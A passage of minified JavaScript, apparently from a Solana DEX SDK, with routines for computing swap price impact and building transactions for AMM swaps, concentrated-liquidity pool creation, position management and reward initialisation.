          p = new bI(h.toString())
            .div(10 ** t[a ? "mintB" : "mintA"].decimals)
            .div(
              new bI(f.toString()).div(10 ** t[a ? "mintA" : "mintB"].decimals)
            );
        this.logDebug(
          "currentPrice:",
          `1 ${u.symbol || u.address}  ${p.toString()} ${
            c.symbol || c.address
          }`
        ),
          this.logDebug(
            "currentPrice invert:",
            `1 ${c.symbol || c.address}  ${new bI(1).div(p).toString()} ${
              u.symbol || u.address
            }`
          );
        let m = new Yn(0),
          g = e;
        if (!g.isZero()) {
          g.gt(h) && (g = h.sub(new Yn(1)));
          let t = h.sub(g);
          m = f.mul(g).div(t).mul(mE).div(mE.sub(pE));
        }
        let y = new Yn(new bI(m.toString()).mul(1 + o).toFixed(0)),
          w = m,
          b = y;
        this.logDebug(
          "amountIn:",
          new bI(w.toString())
            .div(10 ** u.decimals)
            .toDecimalPlaces(u.decimals)
            .toString()
        ),
          this.logDebug(
            "maxAmountIn:",
            new bI(b.toString())
              .div(10 ** u.decimals)
              .toDecimalPlaces(u.decimals)
              .toString()
          );
        let v = null;
        !m.isZero() &&
          !g.isZero() &&
          ((v = new bI(g.toString())
            .div(10 ** c.decimals)
            .div(new bI(m.toString()).div(10 ** u.decimals))),
          this.logDebug(
            "executionPrice:",
            `1 ${c.symbol || c.address}  ${v
              .toDecimalPlaces(Math.max(t.mintA.decimals, t.mintB.decimals))
              .toString()} ${u.symbol || u.address}`
          ),
          this.logDebug(
            "executionPrice invert:",
            `1 ${c.symbol || c.address}  ${new bI(1)
              .div(v)
              .toDecimalPlaces(Math.max(t.mintA.decimals, t.mintB.decimals))
              .toString()} ${u.symbol || u.address}`
          ));
        let A = p.mul(w.toString()),
          k = A.sub(e.toString()).abs().div(A);
        return (
          this.logDebug("priceImpact:", `${k.toString()}%`),
          {
            amountIn: w,
            maxAmountIn: b,
            currentPrice: p,
            executionPrice: v,
            priceImpact: k,
          }
        );
      }
      async swap({
        poolInfo: t,
        poolKeys: e,
        amountIn: n,
        amountOut: r,
        inputMint: o,
        fixedSide: i,
        txVersion: s,
        config: a,
        computeBudgetConfig: u,
        txTipConfig: c,
        feePayer: l,
      }) {
        let d = this.createTxBuilder(l),
          {
            associatedOnly: f = !0,
            inputUseSolBalance: h = !0,
            outputUseSolBalance: p = !0,
          } = a || {},
          [m, g] =
            o === t.mintA.address ? [t.mintA, t.mintB] : [t.mintB, t.mintA],
          y = h && m.address === GI.toBase58(),
          w = p && g.address === GI.toBase58(),
          { account: b, instructionParams: v } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: Bc,
              mint: new Ji(m.address),
              owner: this.scope.ownerPubKey,
              createInfo: y
                ? { payer: this.scope.ownerPubKey, amount: n }
                : void 0,
              skipCloseAccount: !y,
              notUseTokenAccount: y,
              associatedOnly: f,
            });
        d.addInstruction(v || {}),
          b ||
            this.logAndCreateError("input token account not found", {
              token: m.symbol || m.address,
              tokenAccountIn: b,
              inputTokenUseSolBalance: y,
              associatedOnly: f,
            });
        let { account: A, instructionParams: k } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: Bc,
            mint: new Ji(g.address),
            owner: this.scope.ownerPubKey,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            skipCloseAccount: !w,
            notUseTokenAccount: w,
            associatedOnly: !w && f,
          });
        d.addInstruction(k || {}),
          void 0 === A &&
            this.logAndCreateError("output token account not found", {
              token: g.symbol || g.address,
              tokenAccountOut: A,
              outputTokenUseSolBalance: w,
              associatedOnly: f,
            });
        let I = e || (await this.getAmmPoolKeys(t.id)),
          S = 4;
        return (
          t.pooltype.includes("StablePool") && (S = 5),
          d.addInstruction({
            instructions: [
              zE({
                version: S,
                poolKeys: I,
                userKeys: {
                  tokenAccountIn: b,
                  tokenAccountOut: A,
                  owner: this.scope.ownerPubKey,
                },
                amountIn: n,
                amountOut: r,
                fixedSide: i,
              }),
            ],
            instructionTypes: [4 === S ? LS : qS],
          }),
          d.addCustomComputeBudget(u),
          d.addTipInstruction(c),
          d.versionBuild({ txVersion: s })
        );
      }
      async getRpcPoolInfo(t) {
        return (await this.getRpcPoolInfos([t]))[t];
      }
      async getRpcPoolInfos(t, e) {
        let n = await MA(
            this.scope.connection,
            t.map((t) => ({ pubkey: new Ji(t) })),
            e
          ),
          r = {},
          o = [];
        for (let u = 0; u < t.length; u++) {
          let e = n[u];
          if (null === e || !e.accountInfo)
            throw Error("fetch pool info error: " + String(t[u]));
          let i = wE.decode(e.accountInfo.data);
          (r[String(t[u])] = _A(SA({}, i), { programId: e.accountInfo.owner })),
            o.push(i.baseVault, i.quoteVault);
        }
        let i = {},
          s = await MA(
            this.scope.connection,
            o.map((t) => ({ pubkey: new Ji(t) })),
            e
          );
        for (let u = 0; u < o.length; u++) {
          let t = s[u].accountInfo;
          if (null === t) throw Error("fetch vault info error: " + o[u]);
          i[String(o[u])] = new Yn($c.decode(t.data).amount.toString());
        }
        let a = {};
        for (let [u, c] of Object.entries(r)) {
          let t = i[c.baseVault.toString()].sub(c.baseNeedTakePnl),
            e = i[c.quoteVault.toString()].sub(c.quoteNeedTakePnl);
          a[u] = _A(SA({}, c), {
            baseReserve: t,
            mintAAmount: i[c.baseVault.toString()],
            mintBAmount: i[c.quoteVault.toString()],
            quoteReserve: e,
            poolPrice: new bI(e.toString())
              .div(new bI(10).pow(c.quoteDecimal.toString()))
              .div(
                new bI(t.toString()).div(
                  new bI(10).pow(c.baseDecimal.toString())
                )
              ),
          });
        }
        return a;
      }
      async getPoolInfoFromRpc({ poolId: t }) {
        let e = await this.getRpcPoolInfo(t),
          n = HE({ [t]: e });
        return {
          poolRpcData: e,
          poolInfo: n[t],
          poolKeys: (
            await this.scope.tradeV2.computePoolToPoolKeys({
              pools: [n[t]],
              ammRpcData: { [t]: e },
            })
          )[0],
        };
      }
    },
    QE = class extends cT {
      constructor(t) {
        super(t);
      }
      async getClmmPoolKeys(t) {
        return (await this.scope.api.fetchPoolKeysById({ idList: [t] }))[0];
      }
      async createPool(t) {
        var e;
        let {
            programId: n,
            owner: r = (null == (e = this.scope.owner)
              ? void 0
              : e.publicKey) || Ji.default,
            mint1: o,
            mint2: i,
            ammConfig: s,
            initialPrice: a,
            computeBudgetConfig: u,
            forerunCreate: c,
            getObserveState: l,
            txVersion: d,
            txTipConfig: f,
            feePayer: h,
          } = t,
          p = this.createTxBuilder(h),
          [m, g, y] = new Yn(new Ji(o.address).toBuffer()).gt(
            new Yn(new Ji(i.address).toBuffer())
          )
            ? [i, o, new bI(1).div(a)]
            : [o, i, a],
          w = KC.priceToSqrtPriceX64(y, m.decimals, g.decimals),
          b = [],
          v = [];
        m.programId === Cc.toBase58() &&
          v.push(PC(n, new Ji(m.address)).publicKey),
          g.programId === Cc.toBase58() &&
            v.push(PC(n, new Ji(g.address)).publicKey),
          (await this.scope.connection.getMultipleAccountsInfo(v)).forEach(
            (t, e) => {
              t && b.push(v[e]);
            }
          );
        let A = await cE.createPoolInstructions({
          connection: this.scope.connection,
          programId: n,
          owner: r,
          mintA: m,
          mintB: g,
          ammConfigId: s.id,
          initialPriceX64: w,
          forerunCreate: !l && c,
          extendMintAccount: b,
        });
        return (
          p.addInstruction(A),
          p.addCustomComputeBudget(u),
          p.addTipInstruction(f),
          p.versionBuild({
            txVersion: d,
            extInfo: {
              address: _A(SA({}, A.address), {
                observationId: A.address.observationId.toBase58(),
                exBitmapAccount: A.address.exBitmapAccount.toBase58(),
                programId: n.toString(),
                id: A.address.poolId.toString(),
                mintA: m,
                mintB: g,
                openTime: "0",
                vault: {
                  A: A.address.mintAVault.toString(),
                  B: A.address.mintBVault.toString(),
                },
                rewardInfos: [],
                config: {
                  id: s.id.toString(),
                  index: s.index,
                  protocolFeeRate: s.protocolFeeRate,
                  tradeFeeRate: s.tradeFeeRate,
                  tickSpacing: s.tickSpacing,
                  fundFeeRate: s.fundFeeRate,
                  description: s.description,
                  defaultRange: 0,
                  defaultRangePoint: [],
                },
              }),
              mockPoolInfo: SA(
                {
                  type: "Concentrated",
                  rewardDefaultPoolInfos: "Clmm",
                  id: A.address.poolId.toString(),
                  mintA: m,
                  mintB: g,
                  feeRate: s.tradeFeeRate,
                  openTime: "0",
                  programId: n.toString(),
                  price: y.toNumber(),
                  config: {
                    id: s.id.toString(),
                    index: s.index,
                    protocolFeeRate: s.protocolFeeRate,
                    tradeFeeRate: s.tradeFeeRate,
                    tickSpacing: s.tickSpacing,
                    fundFeeRate: s.fundFeeRate,
                    description: s.description,
                    defaultRange: 0,
                    defaultRangePoint: [],
                  },
                  burnPercent: 0,
                },
                sC
              ),
              forerunCreate: c,
            },
          })
        );
      }
      async openPositionFromBase({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        tickLower: r,
        tickUpper: o,
        base: i,
        baseAmount: s,
        otherAmountMax: a,
        nft2022: u,
        associatedOnly: c = !0,
        checkCreateATAOwner: l = !1,
        withMetadata: d = "create",
        getEphemeralSigners: f,
        computeBudgetConfig: h,
        txTipConfig: p,
        txVersion: m,
        feePayer: g,
      }) {
        !1 === this.scope.availability.addConcentratedPosition &&
          this.logAndCreateError(
            "add position feature disabled in your region"
          ),
          this.scope.checkOwner();
        let y = this.createTxBuilder(g),
          w = null,
          b = null,
          v = n.useSOLBalance && t.mintA.address === GI.toString(),
          A = n.useSOLBalance && t.mintB.address === GI.toString(),
          [k, I] = "MintA" === i ? [s, a] : [a, s],
          { account: S, instructionParams: _ } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintA.programId,
              mint: new Ji(t.mintA.address),
              owner: this.scope.ownerPubKey,
              createInfo:
                v || k.isZero()
                  ? { payer: this.scope.ownerPubKey, amount: k }
                  : void 0,
              skipCloseAccount: !v,
              notUseTokenAccount: v,
              associatedOnly: !v && c,
              checkCreateATAOwner: l,
            });
        S && (w = S), y.addInstruction(_ || {});
        let { account: T, instructionParams: B } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: t.mintB.programId,
            mint: new Ji(t.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo:
              A || I.isZero()
                ? { payer: this.scope.ownerPubKey, amount: I }
                : void 0,
            skipCloseAccount: !A,
            notUseTokenAccount: A,
            associatedOnly: !A && c,
            checkCreateATAOwner: l,
          });
        T && (b = T),
          y.addInstruction(B || {}),
          (!w || !b) &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              {
                ownerTokenAccountA: null == w ? void 0 : w.toBase58(),
                ownerTokenAccountB: null == b ? void 0 : b.toBase58(),
              }
            );
        let C = e || (await this.getClmmPoolKeys(t.id)),
          E = await cE.openPositionFromBaseInstructions({
            poolInfo: t,
            poolKeys: C,
            ownerInfo: _A(SA({}, n), {
              feePayer: this.scope.ownerPubKey,
              wallet: this.scope.ownerPubKey,
              tokenAccountA: w,
              tokenAccountB: b,
            }),
            tickLower: r,
            tickUpper: o,
            base: i,
            baseAmount: s,
            otherAmountMax: a,
            withMetadata: d,
            getEphemeralSigners: f,
            nft2022: u,
          });
        return (
          y.addInstruction(E),
          y.addCustomComputeBudget(h),
          y.addTipInstruction(p),
          y.versionBuild({ txVersion: m, extInfo: SA({}, E.address) })
        );
      }
      async openPositionFromLiquidity({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        amountMaxA: r,
        amountMaxB: o,
        tickLower: i,
        tickUpper: s,
        liquidity: a,
        associatedOnly: u = !0,
        checkCreateATAOwner: c = !1,
        withMetadata: l = "create",
        txVersion: d,
        computeBudgetConfig: f,
        txTipConfig: h,
        getEphemeralSigners: p,
        nft2022: m,
        feePayer: g,
      }) {
        !1 === this.scope.availability.createConcentratedPosition &&
          this.logAndCreateError(
            "open position feature disabled in your region"
          );
        let y = this.createTxBuilder(g),
          w = null,
          b = null,
          v = n.useSOLBalance && t.mintA.address === GI.toBase58(),
          A = n.useSOLBalance && t.mintB.address === GI.toBase58(),
          { account: k, instructionParams: I } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: t.mintA.programId,
              mint: new Ji(t.mintA.address),
              owner: this.scope.ownerPubKey,
              createInfo:
                v || r.isZero()
                  ? { payer: this.scope.ownerPubKey, amount: r }
                  : void 0,
              skipCloseAccount: !v,
              notUseTokenAccount: v,
              associatedOnly: !v && u,
              checkCreateATAOwner: c,
            });
        k && (w = k), y.addInstruction(I || {});
        let { account: S, instructionParams: _ } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: t.mintB.programId,
            mint: new Ji(t.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo:
              A || o.isZero()
                ? { payer: this.scope.ownerPubKey, amount: o }
                : void 0,
            skipCloseAccount: !A,
            notUseTokenAccount: A,
            associatedOnly: !A && u,
            checkCreateATAOwner: c,
          });
        S && (b = S),
          y.addInstruction(_ || {}),
          (void 0 === w || void 0 === b) &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let T = e || (await this.getClmmPoolKeys(t.id)),
          B = await cE.openPositionFromLiquidityInstructions({
            poolInfo: t,
            poolKeys: T,
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              tokenAccountA: w,
              tokenAccountB: b,
            },
            tickLower: i,
            tickUpper: s,
            liquidity: a,
            amountMaxA: r,
            amountMaxB: o,
            withMetadata: l,
            getEphemeralSigners: p,
            nft2022: m,
          });
        return (
          y.addInstruction(B),
          y.addCustomComputeBudget(f),
          y.addTipInstruction(h),
          y.versionBuild({ txVersion: d, extInfo: { address: B.address } })
        );
      }
      async increasePositionFromLiquidity(t) {
        var e;
        let n,
          r,
          {
            poolInfo: o,
            poolKeys: i,
            ownerPosition: s,
            amountMaxA: a,
            amountMaxB: u,
            liquidity: c,
            ownerInfo: l,
            associatedOnly: d = !0,
            checkCreateATAOwner: f = !1,
            computeBudgetConfig: h,
            txTipConfig: p,
            txVersion: m,
            feePayer: g,
          } = t,
          y = this.createTxBuilder(g),
          w = l.useSOLBalance && o.mintA.address === GI.toString(),
          b = l.useSOLBalance && o.mintB.address === GI.toString(),
          { account: v, instructionParams: A } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: o.mintA.programId,
              mint: new Ji(o.mintA.address),
              notUseTokenAccount: w,
              owner: this.scope.ownerPubKey,
              createInfo:
                w || a.isZero()
                  ? { payer: this.scope.ownerPubKey, amount: a }
                  : void 0,
              skipCloseAccount: !w,
              associatedOnly: !w && d,
              checkCreateATAOwner: f,
            });
        v && (n = v), y.addInstruction(A || {});
        let { account: k, instructionParams: I } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: o.mintB.programId,
            mint: new Ji(o.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo:
              b || u.isZero()
                ? { payer: this.scope.ownerPubKey, amount: u }
                : void 0,
            notUseTokenAccount: b,
            skipCloseAccount: !b,
            associatedOnly: !b && d,
            checkCreateATAOwner: f,
          });
        k && (r = k),
          y.addInstruction(I || {}),
          !n &&
            !r &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let S = null != i ? i : await this.getClmmPoolKeys(o.id),
          _ = cE.increasePositionFromLiquidityInstructions({
            poolInfo: o,
            poolKeys: S,
            ownerPosition: s,
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              tokenAccountA: n,
              tokenAccountB: r,
            },
            liquidity: c,
            amountMaxA: a,
            amountMaxB: u,
            nft2022:
              null ==
              (e = await this.scope.connection.getAccountInfo(s.nftMint))
                ? void 0
                : e.owner.equals(Cc),
          });
        return (
          y.addInstruction(_),
          y.addCustomComputeBudget(h),
          y.addTipInstruction(p),
          y.versionBuild({ txVersion: m, extInfo: { address: _.address } })
        );
      }
      async increasePositionFromBase(t) {
        var e;
        let n,
          r,
          {
            poolInfo: o,
            ownerPosition: i,
            base: s,
            baseAmount: a,
            otherAmountMax: u,
            ownerInfo: c,
            associatedOnly: l = !0,
            checkCreateATAOwner: d = !1,
            computeBudgetConfig: f,
            txTipConfig: h,
            txVersion: p,
            feePayer: m,
          } = t,
          g = this.createTxBuilder(m),
          y = c.useSOLBalance && o.mintA.address === GI.toString(),
          w = c.useSOLBalance && o.mintB.address === GI.toString(),
          { account: b, instructionParams: v } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: o.mintA.programId,
              mint: new Ji(o.mintA.address),
              notUseTokenAccount: y,
              owner: this.scope.ownerPubKey,
              createInfo:
                y || ("MintA" === s ? a : u).isZero()
                  ? {
                      payer: this.scope.ownerPubKey,
                      amount: "MintA" === s ? a : u,
                    }
                  : void 0,
              skipCloseAccount: !y,
              associatedOnly: !y && l,
              checkCreateATAOwner: d,
            });
        b && (n = b), g.addInstruction(v || {});
        let { account: A, instructionParams: k } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: o.mintB.programId,
            mint: new Ji(o.mintB.address),
            owner: this.scope.ownerPubKey,
            createInfo:
              w || ("MintA" === s ? u : a).isZero()
                ? {
                    payer: this.scope.ownerPubKey,
                    amount: "MintA" === s ? u : a,
                  }
                : void 0,
            notUseTokenAccount: w,
            skipCloseAccount: !w,
            associatedOnly: !w && l,
            checkCreateATAOwner: d,
          });
        A && (r = A),
          g.addInstruction(k || {}),
          !n &&
            !r &&
            this.logAndCreateError(
              "cannot found target token accounts",
              "tokenAccounts",
              this.scope.account.tokenAccounts
            );
        let I = await this.getClmmPoolKeys(o.id),
          S = cE.increasePositionFromBaseInstructions({
            poolInfo: o,
            poolKeys: I,
            ownerPosition: i,
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              tokenAccountA: n,
              tokenAccountB: r,
            },
            base: s,
            baseAmount: a,
            otherAmountMax: u,
            nft2022:
              null ==
              (e = await this.scope.connection.getAccountInfo(i.nftMint))
                ? void 0
                : e.owner.equals(Cc),
          });
        return (
          g.addInstruction(S),
          g.addCustomComputeBudget(f),
          g.addTipInstruction(h),
          g.versionBuild({ txVersion: p, extInfo: { address: S.address } })
        );
      }
      async decreaseLiquidity(t) {
        var e;
        let {
          poolInfo: n,
          poolKeys: r,
          ownerPosition: o,
          ownerInfo: i,
          amountMinA: s,
          amountMinB: a,
          liquidity: u,
          associatedOnly: c = !0,
          checkCreateATAOwner: l = !1,
          computeBudgetConfig: d,
          txTipConfig: f,
          txVersion: h,
          feePayer: p,
        } = t;
        !1 === this.scope.availability.removeConcentratedPosition &&
          this.logAndCreateError(
            "remove position feature disabled in your region"
          );
        let m,
          g,
          y = this.createTxBuilder(p),
          w = i.useSOLBalance && n.mintA.address === GI.toString(),
          b = i.useSOLBalance && n.mintB.address === GI.toString(),
          { account: v, instructionParams: A } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: n.mintA.programId,
              mint: new Ji(n.mintA.address),
              notUseTokenAccount: w,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !w,
              associatedOnly: !w && c,
              checkCreateATAOwner: l,
            });
        (m = v), A && y.addInstruction(A);
        let { account: k, instructionParams: I } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: n.mintB.programId,
            mint: new Ji(n.mintB.address),
            notUseTokenAccount: b,
            owner: this.scope.ownerPubKey,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            skipCloseAccount: !b,
            associatedOnly: !b && c,
            checkCreateATAOwner: l,
          });
        (g = k), I && y.addInstruction(I);
        let S = [];
        for (let E of n.rewardDefaultInfos) {
          let t,
            e = i.useSOLBalance && E.mint.address === GI.toString();
          if (E.mint.address === n.mintA.address) t = m;
          else if (E.mint.address === n.mintB.address) t = g;
          else {
            let { account: n, instructionParams: r } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: new Ji(E.mint.programId),
                mint: new Ji(E.mint.address),
                notUseTokenAccount: e,
                owner: this.scope.ownerPubKey,
                createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
                skipCloseAccount: !e,
                associatedOnly: !e && c,
                checkCreateATAOwner: l,
              });
            (t = n), r && y.addInstruction(r);
          }
          S.push(t);
        }
        !m &&
          !g &&
          this.logAndCreateError(
            "cannot found target token accounts",
            "tokenAccounts",
            this.scope.account.tokenAccountRawInfos
          );
        let _ = null != r ? r : await this.getClmmPoolKeys(n.id),
          T =
            null == (e = await this.scope.connection.getAccountInfo(o.nftMint))
              ? void 0
              : e.owner.equals(Cc),
          B = await cE.decreaseLiquidityInstructions({
            poolInfo: n,
            poolKeys: _,
            ownerPosition: o,
            ownerInfo: {
              wallet: this.scope.ownerPubKey,
              tokenAccountA: m,
              tokenAccountB: g,
              rewardAccounts: S,
            },
            liquidity: u,
            amountMinA: s,
            amountMinB: a,
            nft2022: T,
          });
        y.addInstruction({
          instructions: B.instructions,
          instructionTypes: [SS],
        });
        let C = SA({}, B.address);
        if (i.closePosition) {
          let t = await cE.closePositionInstructions({
            poolInfo: n,
            poolKeys: _,
            ownerInfo: { wallet: this.scope.ownerPubKey },
            ownerPosition: o,
            nft2022: T,
          });
          y.addInstruction({
            endInstructions: t.instructions,
            endInstructionTypes: t.instructionTypes,
          }),
            (C = SA(SA({}, C), t.address));
        }
        return (
          y.addCustomComputeBudget(d),
          y.addTipInstruction(f),
          y.versionBuild({ txVersion: h, extInfo: { address: C } })
        );
      }
      async lockPosition(t) {
        var e;
        let {
            programId: n = B_,
            authProgramId: r = C_,
            poolProgramId: o = T_,
            ownerPosition: i,
            payer: s,
            computeBudgetConfig: a,
            txTipConfig: u,
            txVersion: c,
            getEphemeralSigners: l,
            feePayer: d,
          } = t,
          f = this.createTxBuilder(d),
          h = await cE.makeLockPositions({
            programId: n,
            authProgramId: r,
            poolProgramId: o,
            wallet: this.scope.ownerPubKey,
            payer: null != s ? s : this.scope.ownerPubKey,
            nftMint: i.nftMint,
            getEphemeralSigners: l,
            nft2022:
              null ==
              (e = await this.scope.connection.getAccountInfo(i.nftMint))
                ? void 0
                : e.owner.equals(Cc),
          });
        return (
          f.addInstruction(h),
          f.addCustomComputeBudget(a),
          f.addTipInstruction(u),
          f.versionBuild({ txVersion: c, extInfo: h.address })
        );
      }
      async harvestLockPosition(t) {
        let {
            programId: e = B_,
            authProgramId: n = C_,
            clmmProgram: r = T_,
            poolKeys: o,
            lockData: i,
            ownerInfo: s = { useSOLBalance: !0 },
            associatedOnly: a = !0,
            checkCreateATAOwner: u = !1,
            computeBudgetConfig: c,
            txTipConfig: l,
            txVersion: d,
            feePayer: f,
          } = t,
          h = o || (await this.getClmmPoolKeys(i.poolId.toString())),
          p = this.createTxBuilder(f),
          m = await this.scope.connection.getAccountInfo(i.positionId);
        m || this.logger.logWithError("position not found", i.positionId);
        let g,
          y,
          w = tE.decode(m.data),
          b = s.useSOLBalance && h.mintA.address === GI.toString(),
          v = s.useSOLBalance && h.mintB.address === GI.toString(),
          { account: A, instructionParams: k } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: h.mintA.programId,
              mint: new Ji(h.mintA.address),
              notUseTokenAccount: b,
              owner: this.scope.ownerPubKey,
              createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
              skipCloseAccount: !b,
              associatedOnly: !b && a,
              checkCreateATAOwner: u,
            });
        (g = A), k && p.addInstruction(k);
        let { account: I, instructionParams: S } =
          await this.scope.account.getOrCreateTokenAccount({
            tokenProgram: h.mintB.programId,
            mint: new Ji(h.mintB.address),
            notUseTokenAccount: v,
            owner: this.scope.ownerPubKey,
            createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
            skipCloseAccount: !v,
            associatedOnly: !v && a,
            checkCreateATAOwner: u,
          });
        (y = I), S && p.addInstruction(S);
        let _ = {},
          T = [];
        for (let N of h.rewardInfos) {
          let t = s.useSOLBalance && N.mint.address === GI.toString(),
            e = _[N.mint.address];
          if (!e) {
            let { account: n, instructionParams: r } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: new Ji(N.mint.programId),
                mint: new Ji(N.mint.address),
                notUseTokenAccount: t,
                owner: this.scope.ownerPubKey,
                skipCloseAccount: !t,
                createInfo: { payer: this.scope.ownerPubKey, amount: 0 },
                associatedOnly: !t && a,
              });
            (e = n), r && p.addInstruction(r);
          }
          (_[N.mint.address] = e), T.push(e);
        }
        let B = EC(e, i.lockNftMint).publicKey,
          C = y_(this.scope.ownerPubKey, i.lockNftMint, Bc).publicKey,
          E = HC.getTickArrayStartIndexByTick(
            w.tickLower,
            h.config.tickSpacing
          ),
          x = HC.getTickArrayStartIndexByTick(
            w.tickUpper,
            h.config.tickSpacing
          ),
          { publicKey: P } = AC(new Ji(h.programId), i.poolId, E),
          { publicKey: O } = AC(new Ji(h.programId), i.poolId, x),
          { publicKey: R } = kC(
            new Ji(h.programId),
            i.poolId,
            w.tickLower,
            w.tickUpper
          ),
          M = [];
        for (let N = 0; N < h.rewardInfos.length; N++)
          M.push({
            poolRewardVault: new Ji(h.rewardInfos[N].vault),
            ownerRewardVault: T[N],
            rewardMint: new Ji(h.rewardInfos[N].mint.address),
          });
        let L = await cE.harvestLockPositionInstructionV2({
          programId: e,
          auth: n,
          lockPositionId: B,
          clmmProgram: r,
          lockOwner: this.scope.ownerPubKey,
          lockNftMint: i.lockNftMint,
          lockNftAccount: C,
          positionNftAccount: i.nftAccount,
          positionId: i.positionId,
          poolId: i.poolId,
          protocolPosition: R,
          vaultA: new Ji(h.vault.A),
          vaultB: new Ji(h.vault.B),
          tickArrayLower: P,
          tickArrayUpper: O,
          userVaultA: g,
          userVaultB: y,
          mintA: new Ji(h.mintA.address),
          mintB: new Ji(h.mintB.address),
          rewardAccounts: M,
          exTickArrayBitmap: TC(r, i.poolId).publicKey,
        });
        return (
          p.addInstruction({ instructions: [L], instructionTypes: [OS] }),
          p.addCustomComputeBudget(c),
          p.addTipInstruction(l),
          p.versionBuild({ txVersion: d })
        );
      }
      async closePosition({
        poolInfo: t,
        poolKeys: e,
        ownerPosition: n,
        txVersion: r,
        computeBudgetConfig: o,
        txTipConfig: i,
        feePayer: s,
      }) {
        var a;
        !1 === this.scope.availability.removeConcentratedPosition &&
          this.logAndCreateError(
            "remove position feature disabled in your region"
          );
        let u = this.createTxBuilder(s),
          c = null != e ? e : await this.getClmmPoolKeys(t.id),
          l = cE.closePositionInstructions({
            poolInfo: t,
            poolKeys: c,
            ownerInfo: { wallet: this.scope.ownerPubKey },
            ownerPosition: n,
            nft2022:
              null ==
              (a = await this.scope.connection.getAccountInfo(n.nftMint))
                ? void 0
                : a.owner.equals(Cc),
          });
        return (
          u.addCustomComputeBudget(o),
          u.addTipInstruction(i),
          u
            .addInstruction(l)
            .versionBuild({ txVersion: r, extInfo: { address: l.address } })
        );
      }
      async initReward({
        poolInfo: t,
        ownerInfo: e,
        rewardInfo: n,
        associatedOnly: r = !0,
        checkCreateATAOwner: o = !1,
        computeBudgetConfig: i,
        txVersion: s,
        feePayer: a,
      }) {
        n.endTime <= n.openTime &&
          this.logAndCreateError("reward time error", "rewardInfo", n);
        let u = this.createTxBuilder(a),
          c = e.useSOLBalance && n.mint.address.toString() === GI.toString(),
          l = n.perSecond.mul(n.endTime - n.openTime),
          { account: d, instructionParams: f } =
            await this.scope.account.getOrCreateTokenAccount({
              tokenProgram: new Ji(n.mint.address),
              mint: new Ji(n.mint.address),
              notUseTokenAccount: !!c,
              skipCloseAccount: !c,
              owner: this.scope.ownerPubKey,
              createInfo: c
                ? {
                    payer: e.feePayer || this.scope.ownerPubKey,
                    amount: new Yn(
                      new bI(l.toFixed(0)).gte(l)
                        ? l.toFixed(0)
                        : l.add(1).toFixed(0)
                    ),
                  }
                : void 0,
              associatedOnly: !c && r,
              checkCreateATAOwner: o,
            });
        f && u.addInstruction(f),
          d ||
            this.logAndCreateError(
              "no money",
              "ownerRewardAccount",
              this.scope.account.tokenAccountRawInfos
            );
        let h = await this.getClmmPoolKeys(t.id),
          p = cE.initRewardInstructions({
            poolInfo: t,
            poolKeys: h,
            ownerInfo: { wallet: this.scope.ownerPubKey, tokenAccount: d },
            rewardInfo: {
              programId: new Ji(n.mint.programId),
              mint: new Ji(n.mint.address),
              openTime: n.openTime,
              endTime: n.endTime,
              emissionsPerSecondX64: UC.decimalToX64(n.perSecond),
            },
          });
        return (
          u.addInstruction(p),
          u.addCustomComputeBudget(i),
          u.versionBuild({ txVersion: s, extInfo: { address: p.address } })
        );
      }
      async initRewards({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        rewardInfos: r,
        associatedOnly: o = !0,
        checkCreateATAOwner: i = !1,
        computeBudgetConfig: s,
        txTipConfig: a,
        txVersion: u,
        feePayer: c,
      }) {
        for (let f of r)
          f.endTime <= f.openTime &&
            this.logAndCreateError("reward time error", "rewardInfo", f);
        let l = this.createTxBuilder(c),
          d = {};
        for (let f of r) {
          let r = n.useSOLBalance && f.mint.address === GI.toString(),
            s = f.perSecond.mul(f.endTime - f.openTime),
            { account: a, instructionParams: u } =
              await this.scope.account.getOrCreateTokenAccount({
                tokenProgram: new Ji(f.mint.programId),
                mint: new Ji(f.mint.address),
                notUseTokenAccount: !!r,
                skipCloseAccount: !r,
                owner: this.scope.ownerPubKey,
                createInfo: r
                  ? {
                      payer: n.feePayer || this.scope.ownerPubKey,
                      amount: new Yn(
                        new bI(s.toFixed(0)).gte(s)
                          ? s.toFixed(0)
                          : s.add(1).toFixed(0)
                      ),
                    }
                  : void 0,
                associatedOnly: !r && o,
                checkCreateATAOwner: i,
              });
          u && l.addInstruction(u),
            a ||
              this.logAndCreateError(
                "no money",
                "ownerRewardAccount",
                this.scope.account.tokenAccountRawInfos
              );
          let c = null != e ? e : await this.getClmmPoolKeys(t.id),
            h = cE.initRewardInstructions({
              poolInfo: t,
